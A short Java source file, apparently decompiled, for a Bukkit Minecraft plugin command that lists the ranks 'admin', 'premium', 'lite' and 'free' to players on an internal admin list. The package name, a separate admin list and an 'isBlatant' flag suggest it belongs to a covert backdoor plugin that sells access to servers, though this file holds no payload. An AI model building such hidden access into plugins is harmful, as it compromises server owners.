
package me.system.runner.command.impl.admin;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class ListranksCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.admin.contains(p2.getName())) {
            p2.sendMessage(Settings.PREFIX("This is a list of all the ranks you can log people into!"));
            p2.sendMessage(Settings.INFO("admin"));
            p2.sendMessage(Settings.INFO("premium"));
            p2.sendMessage(Settings.INFO("lite"));
            p2.sendMessage(Settings.INFO("free"));

        } else {
            p2.sendMessage(Settings.PREFIX("You must be an " + Settings.RED + "admin " + Settings.WHITE + "to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

